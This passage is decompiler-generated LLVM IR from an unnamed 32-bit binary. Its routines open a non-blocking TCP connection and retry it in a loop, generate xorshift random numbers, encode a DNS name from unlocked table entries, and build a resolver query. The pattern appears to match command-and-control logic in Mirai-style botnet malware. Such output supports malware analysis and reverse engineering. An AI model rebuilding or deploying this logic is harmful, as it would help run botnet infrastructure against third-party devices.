  %v14_804e369 = icmp eq i32 %v2_804e369, %v1_804e368
  br i1 %v14_804e369, label %dec_label_pc_804e2ca, label %dec_label_pc_804e24a

dec_label_pc_804e378:                             ; preds = %dec_label_pc_804e270
  %v1_804e378 = add i32 %v0_804e378, 1
  %v2_804e379 = load i32, i32* %v1_804e379, align 4
  %v14_804e379 = icmp eq i32 %v2_804e379, %v1_804e378
  br i1 %v14_804e379, label %dec_label_pc_804e2ca, label %dec_label_pc_804e282

dec_label_pc_804e388:                             ; preds = %dec_label_pc_804e2aa
  %v1_804e388 = add i32 %v0_804e388128, 1
  %v12_804e389 = icmp eq i32 %v3_804e288, %v1_804e388
  br i1 %v12_804e389, label %dec_label_pc_804e2ca, label %dec_label_pc_804e2a0.backedge

dec_label_pc_804e2a0.backedge:                    ; preds = %dec_label_pc_804e388, %dec_label_pc_804e2b9
  %v3_804e2b091 = phi i32 [ 0, %dec_label_pc_804e2b9 ], [ %v1_804e388, %dec_label_pc_804e388 ]
  %storemerge32.in = add i32 %v0_804e391129, 1
  %v1_804e2a0 = add i32 %v1_804e2a0131, -1
  store i32 %v1_804e2a0, i32* @ebx, align 4
  %v10_804e2a1 = icmp eq i32 %v1_804e2a0131, 0
  br i1 %v10_804e2a1, label %dec_label_pc_804e18c, label %dec_label_pc_804e2aa

dec_label_pc_804e397:                             ; preds = %dec_label_pc_804e18c
  %v2_804e39a = inttoptr i32 %v0_804e1a1 to i32*
  store i32 12, i32* %v2_804e39a, align 4
  %v2_804e39c = call i32 @function_8051270(i8 0)
  store i32 %v2_804e39c, i32* %eax.global-to-local, align 4
  %v0_804e3a1 = load i32, i32* @esp, align 4
  %v1_804e3a1 = inttoptr i32 %v0_804e3a1 to i32*
  store i32 13, i32* %v1_804e3a1, align 4
  %v2_804e3a8 = call i32 @function_8051270(i8 0)
  store i32 %v2_804e3a8, i32* %eax.global-to-local, align 4
  %v0_804e3ad = load i32, i32* @esp, align 4
  %v1_804e3ad = inttoptr i32 %v0_804e3ad to i32*
  store i32 14, i32* %v1_804e3ad, align 4
  %v2_804e3b4 = call i32 @function_8051270(i8 0)
  store i32 %v2_804e3b4, i32* %eax.global-to-local, align 4
  %v0_804e3b9 = load i32, i32* @esp, align 4
  %v1_804e3b9 = inttoptr i32 %v0_804e3b9 to i32*
  store i32 15, i32* %v1_804e3b9, align 4
  %v2_804e3c0 = call i32 @function_8051270(i8 0)
  store i32 %v2_804e3c0, i32* %eax.global-to-local, align 4
  %v0_804e3c5 = load i32, i32* @esp, align 4
  %v1_804e3c5 = inttoptr i32 %v0_804e3c5 to i32*
  store i32 16, i32* %v1_804e3c5, align 4
  %v2_804e3cc = call i32 @function_8051270(i8 0)
  store i32 %v2_804e3cc, i32* %eax.global-to-local, align 4
  %v0_804e3d1 = load i32, i32* @esp, align 4
  %v1_804e3d1 = inttoptr i32 %v0_804e3d1 to i32*
  %v2_804e3d1 = load i32, i32* %v1_804e3d1, align 4
  store i32 %v2_804e3d1, i32* %eax.global-to-local, align 4
  %v1_804e3d2 = add i32 %v0_804e3d1, 56
  %v2_804e3d2 = inttoptr i32 %v1_804e3d2 to i32*
  %v3_804e3d2 = load i32, i32* %v2_804e3d2, align 4
  store i32 %v3_804e3d2, i32* @edi, align 4
  store i32 %v3_804e3d2, i32* %v1_804e3d1, align 4
  %v1_804e3d7 = call i32 @function_80521e1(i32 0)
  store i32 %v1_804e3d7, i32* @eax, align 4
  %v0_804e3dc = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e31c

; uselistorder directives
  uselistorder i32 %v1_804e2a0, { 1, 0 }
  uselistorder i32 %v6_804e2ae, { 2, 0, 1 }
  uselistorder i32 %v0_804e391129, { 1, 0 }
  uselistorder i32 %v2_804e28f, { 1, 0 }
  uselistorder i32 %v3_804e288, { 1, 0, 2 }
  uselistorder i32 %v0_804e18c52, { 2, 1, 0 }
  uselistorder i32 %v0_804e297, { 0, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 %v6_804e274, { 0, 2, 1 }
  uselistorder i32 %v0_804e378, { 1, 0 }
  uselistorder i32 %v0_804e263, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e25a, { 1, 0 }
  uselistorder i32 %v1_804e25a, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804e25a, { 1, 2, 3, 4, 7, 0, 8, 5, 6, 9 }
  uselistorder i32 %v0_804e250, { 1, 0 }
  uselistorder i32 %v6_804e23c, { 1, 0 }
  uselistorder i32 %v0_804e368, { 1, 0 }
  uselistorder i32 %v0_804e22f, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e226, { 1, 0 }
  uselistorder i32 %v0_804e226, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e21c, { 1, 0 }
  uselistorder i32 %v6_804e208, { 1, 0 }
  uselistorder i32 %v0_804e358, { 1, 0 }
  uselistorder i32 %v0_804e1fb, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1f2, { 1, 0 }
  uselistorder i32 %v0_804e1f2, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e1e8, { 1, 0 }
  uselistorder i32 %v6_804e1d4, { 1, 0 }
  uselistorder i32 %v0_804e2c0, { 1, 0 }
  uselistorder i32 %v0_804e1c1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1b8, { 1, 0 }
  uselistorder i32 %v0_804e1b8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804e18c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e0c7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e0a4, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_804e09f, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e03a, { 1, 0 }
  uselistorder i32 %v0_804e031, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e03a.pre, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_804e013, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804dfda, { 0, 2, 1 }
  uselistorder i32 %v4_804df95, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804df3a, { 2, 1, 0 }
  uselistorder i32 %v0_804def4, { 1, 0, 2 }
  uselistorder i32 %v1_804dea1, { 1, 0 }
  uselistorder i32 %v1_804de9e, { 2, 1, 0 }
  uselistorder i32 %v0_804de9e, { 1, 0, 2 }
  uselistorder i32 %v2_804de9c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804deb8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804de6d, { 1, 0 }
  uselistorder i32 %v1_804de6a, { 1, 0, 2 }
  uselistorder i32 %v0_804de5d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804de58, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804de50, { 1, 0 }
  uselistorder i32 %v3_804dd85, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dd43, { 1, 0, 2 }
  uselistorder i32 %v2_804dd2f, { 3, 2, 4, 0, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 %v1_804dcf2, { 0, 2, 1 }
  uselistorder i32 %v3_804dcb4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v3_804dc67, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804dc13, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 129, 130, 131, 132, 133, 134, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 135, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i32 8424, { 1, 0 }
  uselistorder i32 ()* @function_8052534, { 2, 1, 0 }
  uselistorder i32 ()* @function_8051fb0, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_8051f30, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 8264, { 0, 2, 1 }
  uselistorder i32 8328, { 0, 1, 3, 2 }
  uselistorder i32 ()* @function_8052695, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_80525a4, { 2, 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_8051c60, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 27, 28, 29, 30, 26, 31, 32, 33, 34, 58, 59, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 60, 61, 62, 63 }
  uselistorder i8 7, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e31c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e2ca, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e2aa, { 1, 0 }
  uselistorder label %dec_label_pc_804e288, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e270, { 1, 0 }
  uselistorder label %dec_label_pc_804e250, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e238, { 1, 0 }
  uselistorder label %dec_label_pc_804e21c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e204, { 1, 0 }
  uselistorder label %dec_label_pc_804e1e8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e1d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e18c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804e0c7, { 1, 0 }
  uselistorder label %dec_label_pc_804e0bb, { 1, 0 }
  uselistorder label %dec_label_pc_804e038, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dffd, { 1, 0 }
  uselistorder label %dec_label_pc_804de50, { 6, 3, 1, 0, 4, 5, 2, 7 }
  uselistorder label %dec_label_pc_804dde2, { 1, 0 }
  uselistorder label %dec_label_pc_804dce1, { 1, 0 }
  uselistorder label %dec_label_pc_804dc94, { 1, 0 }
}

define i32 @function_804e3f0() local_unnamed_addr {
dec_label_pc_804e3f0:
  store i32 134538560, i32* @global_var_80567f4.24, align 4
  %v0_804e3fa = load i32, i32* @eax, align 4
  ret i32 %v0_804e3fa
}

define i32 @function_804e400() local_unnamed_addr {
dec_label_pc_804e400:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_804e413 = call i32 @function_80529d5(i32 2, i32 1, i32 0)
  store i32 %v3_804e413, i32* @global_var_80567ec.25, align 4
  %v10_804e422 = icmp eq i32 %v3_804e413, -1
  br i1 %v10_804e422, label %dec_label_pc_804e4c0, label %dec_label_pc_804e42b

dec_label_pc_804e42b:                             ; preds = %dec_label_pc_804e400
  %v2_804e430 = ptrtoint i32* %stack_var_-12 to i32
  %v5_804e43a = call i32 @function_805299a(i32 %v3_804e413, i32 1, i32 2, i32 %v2_804e430, i32 4)
  %v0_804e442 = load i32, i32* @global_var_80567ec.25, align 4
  %v3_804e44c = call i32 @function_805211d(i32 %v0_804e442, i32 3, i32 0)
  %v12_804e454 = or i32 %v3_804e44c, 2048
  %v0_804e458 = load i32, i32* @global_var_80567ec.25, align 4
  %v3_804e460 = call i32 @function_805211d(i32 %v0_804e458, i32 4, i32 %v12_804e454)
  %v0_804e46d = load i8, i8* @global_var_80567f8.26, align 8
  %v1_804e46d = icmp eq i8 %v0_804e46d, 0
  br i1 %v1_804e46d, label %dec_label_pc_804e4c6, label %dec_label_pc_804e476

dec_label_pc_804e476:                             ; preds = %dec_label_pc_804e42b, %dec_label_pc_804e4c6
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804e488 = call i32 @function_8052719(i32 2)
  %v2_804e48d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v1_804e488, i32* @ebx, align 4
  %v1_804e493 = inttoptr i32 %v1_804e488 to i32*
  store i32 0, i32* %v1_804e493, align 4
  %v0_804e49a = load i32, i32* @global_var_80567ec.25, align 4
  %v4_804e4a3 = call i32 @function_80527cf(i32 %v0_804e49a, i32 %v2_804e48d, i32 16, i32 %v1_804e488)
  %v8_804e4ab = icmp eq i32 %v4_804e4a3, -1
  br i1 %v8_804e4ab, label %dec_label_pc_804e4d0, label %dec_label_pc_804e4ae

dec_label_pc_804e4ae:                             ; preds = %dec_label_pc_804e476
  %v0_804e4ae = load i32, i32* @global_var_80567ec.25, align 4
  %v2_804e4b8 = call i32 @function_805288b(i32 %v0_804e4ae, i32 1)
  br label %dec_label_pc_804e4c0

dec_label_pc_804e4c0:                             ; preds = %dec_label_pc_804e400, %dec_label_pc_804e4ae
  %v0_804e4c5 = phi i32 [ -1, %dec_label_pc_804e400 ], [ %v2_804e4b8, %dec_label_pc_804e4ae ]
  ret i32 %v0_804e4c5

dec_label_pc_804e4c6:                             ; preds = %dec_label_pc_804e42b
  br label %dec_label_pc_804e476

dec_label_pc_804e4d0:                             ; preds = %dec_label_pc_804e476
  %v0_804e4d0 = load i32, i32* @ebx, align 4
  %v1_804e4d0 = inttoptr i32 %v0_804e4d0 to i32*
  %v2_804e4d0 = load i32, i32* %v1_804e4d0, align 4
  %v11_804e4d0 = icmp eq i32 %v2_804e4d0, 99
  br i1 %v11_804e4d0, label %dec_label_pc_804e52e, label %dec_label_pc_804e4d5

dec_label_pc_804e4d5:                             ; preds = %dec_label_pc_804e4d0, %dec_label_pc_804e52e
  store i32 2, i32* %stack_var_-28, align 4
  %v0_804e4ef = load i32, i32* @global_var_80567ec.25, align 4
  store i32 %v0_804e4ef, i32* @esi, align 4
  %v3_804e4f6 = call i32 @function_80527fa(i32 %v0_804e4ef, i32 %v2_804e48d, i32 16)
  %v1_804e502 = call i32 @function_8053d90(i32 5)
  store i32 5, i32* @ebx, align 4
  %v0_804e508 = load i32, i32* @global_var_80567ec.25, align 4
  %v1_804e50f = call i32 @function_80521e1(i32 %v0_804e508)
  %v1_804e51b = call i32 @function_804d5e0(i32 58811)
  %v0_804e520 = call i32 @function_804e400()
  ret i32 %v0_804e520

dec_label_pc_804e52e:                             ; preds = %dec_label_pc_804e4d0
  store i8 0, i8* @global_var_80567f8.26, align 8
  br label %dec_label_pc_804e4d5

; uselistorder directives
  uselistorder i32 %v3_804e413, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_804d5e0, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @function_805288b, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_80527cf, { 0, 2, 1 }
  uselistorder i8* @global_var_80567f8.26, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_805299a, { 1, 0 }
  uselistorder label %dec_label_pc_804e4d5, { 1, 0 }
  uselistorder label %dec_label_pc_804e4c0, { 1, 0 }
  uselistorder label %dec_label_pc_804e476, { 1, 0 }
}

define i32 @function_804e540() local_unnamed_addr {
dec_label_pc_804e540:
  %stack_var_-12 = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp4, i32* %stack_var_-12, align 4
  %stack_var_-28 = alloca i8*, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804e547 = call i32 @function_80512f0(i8 3)
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v4_804e552 = call i32 @function_8051240(i32 3, i32* null)
  %v4_804e557 = inttoptr i32 %v4_804e552 to i8*
  store i8* %v4_804e557, i8** %stack_var_-28, align 4
  %v3_804e55a = call i32 @function_804f340(i8* %v4_804e557)
  store i32 %v3_804e55a, i32* @esi, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804e568 = call i32 @function_8051270(i8 3)
  %v2_804e570 = icmp eq i32 %v3_804e55a, 0
  br i1 %v2_804e570, label %dec_label_pc_804e5c6, label %dec_label_pc_804e574

dec_label_pc_804e574:                             ; preds = %dec_label_pc_804e540
  %v1_804e55f = inttoptr i32 %v3_804e55a to i8*
  %v2_804e574 = add i32 %v3_804e55a, 4
  %v3_804e574 = inttoptr i32 %v2_804e574 to i32*
  %v4_804e574 = load i32, i32* %v3_804e574, align 4
  store i32 %v4_804e574, i32* @ebx, align 4
  %v0_804e577 = load i8*, i8** %stack_var_-28, align 4
  %v1_804e577 = ptrtoint i8* %v0_804e577 to i32
  %v2_804e577 = call i32 @function_804f070(i32 %v1_804e577)
  %v3_804e577 = sext i32 %v2_804e577 to i64
  %v3_804e581 = load i8, i8* %v1_804e55f, align 1
  %v8_804e587 = zext i8 %v3_804e581 to i64
  %v11_804e587 = urem i64 %v3_804e577, %v8_804e587
  %v12_804e587 = trunc i64 %v11_804e587 to i32
  %v0_804e589 = load i32, i32* @ebx, align 4
  %v2_804e589 = mul nuw nsw i32 %v12_804e587, 4
  %v3_804e589 = add i32 %v2_804e589, %v0_804e589
  %v4_804e589 = inttoptr i32 %v3_804e589 to i32*
  %v5_804e589 = load i32, i32* %v4_804e589, align 4
  %tmp10 = bitcast i8** %stack_var_-28 to i32*
  store i32 %v3_804e55a, i32* %tmp10, align 4
  store i32 %v5_804e589, i32* @global_var_805694c.28, align 4
  %v2_804e592 = call i32 @function_804f300(i32 %v3_804e55a)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v3_804e59e = call i32 @function_80512f0(i8 4)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v4_804e5a9 = call i32 @function_8051240(i32 4, i32* null)
  %v5_804e5a9 = inttoptr i32 %v4_804e5a9 to i16*
  %v3_804e5ae = load i16, i16* %v5_804e5a9, align 2
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  store i16 %v3_804e5ae, i16* bitcast (i32* @global_var_805694a.29 to i16*), align 4
  %v3_804e5be = call i32 @function_8051270(i8 4)
  %v2_804e5c6.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e5c6

dec_label_pc_804e5c6:                             ; preds = %dec_label_pc_804e540, %dec_label_pc_804e574
  %v2_804e5c6 = phi i32 [ %tmp4, %dec_label_pc_804e540 ], [ %v2_804e5c6.pre, %dec_label_pc_804e574 ]
  ret i32 %v2_804e5c6

; uselistorder directives
  uselistorder i32 %v3_804e55a, { 2, 1, 0, 5, 3, 4 }
  uselistorder i8** %stack_var_-28, { 7, 6, 5, 0, 8, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e5c6, { 1, 0 }
}

define i32 @function_804f070(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f070:
  %v0_804f070 = load i32, i32* @global_var_80568c8.30, align 8
  %v0_804f078 = load i32, i32* @global_var_80568d4.31, align 4
  %v2_804f07e = mul i32 %v0_804f070, 2048
  %v2_804f083 = udiv i32 %v0_804f078, 524288
  store i32 %v2_804f083, i32* @ecx, align 4
  %v2_804f086 = xor i32 %v2_804f07e, %v0_804f070
  %v0_804f088 = load i32, i32* @global_var_80568cc.32, align 4
  store i32 %v0_804f088, i32* @global_var_80568c8.30, align 8
  %v0_804f092 = load i32, i32* @global_var_80568d0.33, align 16
  store i32 %v0_804f092, i32* @global_var_80568cc.32, align 4
  store i32 %v0_804f078, i32* @global_var_80568d0.33, align 16
  %v2_804f0a4 = xor i32 %v2_804f083, %v0_804f078
  %v2_804f0a6 = udiv i32 %v2_804f086, 256
  %v2_804f0a9 = xor i32 %v2_804f0a6, %v2_804f086
  %v2_804f0ab = xor i32 %v2_804f0a9, %v2_804f0a4
  store i32 %v2_804f0ab, i32* @global_var_80568d4.31, align 4
  ret i32 %v2_804f0ab

; uselistorder directives
  uselistorder i32 %v2_804f086, { 1, 0 }
  uselistorder i32 %v2_804f083, { 1, 0 }
  uselistorder i32 %v0_804f078, { 1, 2, 0 }
  uselistorder i32 %v0_804f070, { 1, 0 }
}

define i32 @function_804f300(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f300:
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804f300 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f308 = icmp eq i32 %arg1, 0
  br i1 %v1_804f308, label %dec_label_pc_804f300.dec_label_pc_804f330_crit_edge, label %dec_label_pc_804f30c

dec_label_pc_804f300.dec_label_pc_804f330_crit_edge: ; preds = %dec_label_pc_804f300
  br label %dec_label_pc_804f330

dec_label_pc_804f30c:                             ; preds = %dec_label_pc_804f300
  %v1_804f30c = add i32 %arg1, 4
  %v2_804f30c = inttoptr i32 %v1_804f30c to i32*
  %v3_804f30c = load i32, i32* %v2_804f30c, align 4
  %v1_804f30f = icmp eq i32 %v3_804f30c, 0
  br i1 %v1_804f30f, label %dec_label_pc_804f31f, label %dec_label_pc_804f313

dec_label_pc_804f313:                             ; preds = %dec_label_pc_804f30c
  %v1_804f317 = call i32 @function_8053939(i32 %v3_804f30c)
  br label %dec_label_pc_804f31f

dec_label_pc_804f31f:                             ; preds = %dec_label_pc_804f30c, %dec_label_pc_804f313
  store i32 %v0_804f300, i32* @ebx, align 4
  %v1_804f326 = call i32 @function_8053939(i32 %arg1)
  %v2_804f330.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804f330

dec_label_pc_804f330:                             ; preds = %dec_label_pc_804f300.dec_label_pc_804f330_crit_edge, %dec_label_pc_804f31f
  %v2_804f330 = phi i32 [ %tmp12, %dec_label_pc_804f300.dec_label_pc_804f330_crit_edge ], [ %v2_804f330.pre, %dec_label_pc_804f31f ]
  store i32 %v0_804f300, i32* @ebx, align 4
  ret i32 %v2_804f330

; uselistorder directives
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f330, { 1, 0 }
  uselistorder label %dec_label_pc_804f31f, { 1, 0 }
}

define i32 @function_804f340(i8* %arg1) local_unnamed_addr {
dec_label_pc_804f340:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804f34c = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f34c, i32* @ebx, align 4
  %v4_804f357 = call i32 @function_80532e8(i64 1, i32 8)
  %v2_804f360 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  %tmp102 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804f36b = load i32, i32* @ebx, align 4
  %v4_804f36b = inttoptr i32 %v0_804f36b to i8*
  %v3_804f36e = call i32 @function_8051c40(i8* %v4_804f36b)
  %v2_804f373 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804f373, i32* %ecx.global-to-local, align 4
  store i32 %v2_804f360, i32* %edi.global-to-local, align 4
  %v1_804f37e = add i32 %v3_804f36e, 1
  store i32 %v1_804f37e, i32* %eax.global-to-local, align 4
  %tmp103 = icmp slt i32 %v1_804f37e, 1
  br i1 %tmp103, label %dec_label_pc_804f3aa, label %dec_label_pc_804f392.lr.ph

dec_label_pc_804f392.lr.ph:                       ; preds = %dec_label_pc_804f340
  %v0_804f392.pre = load i32, i32* @ebx, align 4
  %v4_804f392.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f392

dec_label_pc_804f384:                             ; preds = %dec_label_pc_804f399
  %v3_804f384 = inttoptr i32 %v2_804f384 to i8*
  store i8 %v2_804f392, i8* %v3_804f384, align 1
  %v0_804f386 = load i32, i32* @esi, align 4
  %v1_804f386 = add i32 %v0_804f386, 1
  store i32 %v1_804f386, i32* @esi, align 4
  %v0_804f387 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f387 = add i32 %v0_804f387, 1
  store i32 %v1_804f387, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f38a

dec_label_pc_804f38a:                             ; preds = %dec_label_pc_804f39d, %dec_label_pc_804f384
  %v0_804f38c = phi i32 [ %v1_804f3a3, %dec_label_pc_804f39d ], [ %v1_804f387, %dec_label_pc_804f384 ]
  %v0_804f38a = load i32, i32* @ebx, align 4
  %v1_804f38a = add i32 %v0_804f38a, 1
  store i32 %v1_804f38a, i32* @ebx, align 4
  %v0_804f38b = load i32, i32* %eax.global-to-local, align 4
  %v1_804f38b = add i32 %v0_804f38b, -1
  store i32 %v1_804f38b, i32* %eax.global-to-local, align 4
  store i32 %v0_804f38c, i32* %ecx.global-to-local, align 4
  %tmp104 = icmp slt i32 %v1_804f38b, 1
  br i1 %tmp104, label %dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge, label %dec_label_pc_804f392

dec_label_pc_804f392:                             ; preds = %dec_label_pc_804f392.lr.ph, %dec_label_pc_804f38a
  %v2_804f384 = phi i32 [ %v2_804f373, %dec_label_pc_804f392.lr.ph ], [ %v0_804f38c, %dec_label_pc_804f38a ]
  %v4_804f392 = phi i32 [ %v4_804f392.pre, %dec_label_pc_804f392.lr.ph ], [ %v0_804f38c, %dec_label_pc_804f38a ]
  %v0_804f392 = phi i32 [ %v0_804f392.pre, %dec_label_pc_804f392.lr.ph ], [ %v1_804f38a, %dec_label_pc_804f38a ]
  %v1_804f392 = inttoptr i32 %v0_804f392 to i8*
  %v2_804f392 = load i8, i8* %v1_804f392, align 1
  %v3_804f392 = zext i8 %v2_804f392 to i32
  %v5_804f392 = and i32 %v4_804f392, -256
  %v6_804f392 = or i32 %v3_804f392, %v5_804f392
  store i32 %v6_804f392, i32* %edx.global-to-local, align 4
  %v10_804f394 = icmp eq i8 %v2_804f392, 46
  br i1 %v10_804f394, label %dec_label_pc_804f39d, label %dec_label_pc_804f399

dec_label_pc_804f399:                             ; preds = %dec_label_pc_804f392
  %v4_804f399 = icmp eq i8 %v2_804f392, 0
  %v1_804f39b = icmp eq i1 %v4_804f399, false
  br i1 %v1_804f39b, label %dec_label_pc_804f384, label %dec_label_pc_804f39d

dec_label_pc_804f39d:                             ; preds = %dec_label_pc_804f399, %dec_label_pc_804f392
  %v0_804f39d = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v1_804f3a1 = trunc i32 %v0_804f39d to i8
  %v2_804f3a1 = load i32, i32* %edi.global-to-local, align 4
  %v3_804f3a1 = inttoptr i32 %v2_804f3a1 to i8*
  store i8 %v1_804f3a1, i8* %v3_804f3a1, align 1
  %v0_804f3a3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f3a3 = add i32 %v0_804f3a3, 1
  store i32 %v1_804f3a3, i32* %edx.global-to-local, align 4
  store i32 %v0_804f3a3, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f38a

dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge: ; preds = %dec_label_pc_804f38a
  br label %dec_label_pc_804f3aa

dec_label_pc_804f3aa:                             ; preds = %dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge, %dec_label_pc_804f340
  %v0_804f3ad = phi i32 [ %v0_804f38c, %dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge ], [ %v2_804f373, %dec_label_pc_804f340 ]
  %v1_804f3ad = inttoptr i32 %v0_804f3ad to i8*
  store i8 0, i8* %v1_804f3ad, align 1
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  %v3_804f3b5 = call i32 @function_8051c40(i8* %tmp102)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804f3c9 = add i32 %v3_804f3b5, %v2_804f360
  store i32 %v2_804f3c9, i32* @edi, align 4
  %v1_804f3ed = add i32 %v2_804f3c9, 1
  store i32 %v1_804f3ed, i32* @ebx, align 4
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  %v3_804f3f5 = call i32 @function_8051c40(i8* %tmp102)
  %v1_804f3fa = add i32 %v3_804f3f5, 17
  store i32 %v1_804f3fa, i32* %eax.global-to-local, align 4
  %v1_804f401 = call i32 @function_804f070(i32 %v1_804f3fa)
  %v2_804f40f = udiv i32 %v1_804f401, 65535
  store i32 %v2_804f40f, i32* %edx.global-to-local, align 4
  %v2_804f41979 = add i32 %v2_804f40f, %v1_804f401
  store i32 %v2_804f41979, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804f429 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f429, i32* %ecx.global-to-local, align 4
  %v3_804f431 = call i32 @function_8051cd0(i32 %v2_804f429, i32 16)
  store i32 %v3_804f431, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804f479 = load i32, i32* @edi, align 4
  %v1_804f479 = add i32 %v0_804f479, 1
